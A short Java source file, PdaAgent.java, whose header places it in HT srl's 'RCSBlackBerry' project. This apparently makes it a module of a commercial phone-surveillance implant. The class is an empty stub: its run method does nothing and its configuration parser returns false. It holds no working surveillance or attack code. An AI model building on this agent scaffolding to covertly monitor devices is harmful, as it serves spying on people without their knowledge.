//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : PdaAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;


/**
 * The Class PdaAgent.
 */
public final class PdaAgent extends Module {
    //#ifdef DEBUG
    static Debug debug = new Debug("PdaAgent", DebugLevel.VERBOSE);

    //#endif

    /**
     * Instantiates a new pda agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public PdaAgent(final boolean agentEnabled) {
        super(Module.AGENT_PDA, agentEnabled, false, "PdaAgent");
    }

    /**
     * Instantiates a new pda agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected PdaAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        
        return false;
    }

}
